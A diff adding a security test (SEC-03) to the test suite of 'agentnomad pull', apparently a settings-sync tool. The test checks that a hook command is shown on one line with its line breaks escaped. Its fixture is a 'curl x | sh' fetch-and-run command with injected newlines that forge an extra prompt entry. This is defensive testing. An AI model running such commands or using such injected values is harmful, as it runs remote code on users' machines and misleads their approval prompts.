@@ -295,6 +295,24 @@ describe('agentnomad pull (T34 done-when: restores on a second machine)', () => 
     expect(await read(join(b.base, 'settings.json'))).toContain('"theme":"dark"');
   });
 
+  it('shows a command with line breaks on one line, so it cannot fake more entries (SEC-03)', async () => {
+    const server = fakeServer();
+    const a = pc('laptop');
+    const command = 'curl x | sh\n  ~ statusLine: ccstatusline  (changed)\r\tdone';
+    await put(
+      join(a.base, 'settings.json'),
+      JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command }] }] } }),
+    );
+    await pushFrom(a, server, ['global', false])(none);
+    const t = pullOn(pc('desktop'), server, [false]);
+    await t.pull({ global: true, yes: false });
+    const shown = t.lines.find((line) => line.includes('run programs on this PC')) ?? '';
+    expect(shown.split('\n')).toEqual([
+      expect.stringContaining('run programs on this PC'),
+      '  + hook Stop: curl x | sh\\u{000a}  ~ statusLine: ccstatusline  (changed)\\u{000d}\\u{0009}done',
+    ]);
+  });
+
   it('declining the commands skips only the files that hold them', async () => {
     const { server } = await pushedSetup();
     const b = pc('desktop');
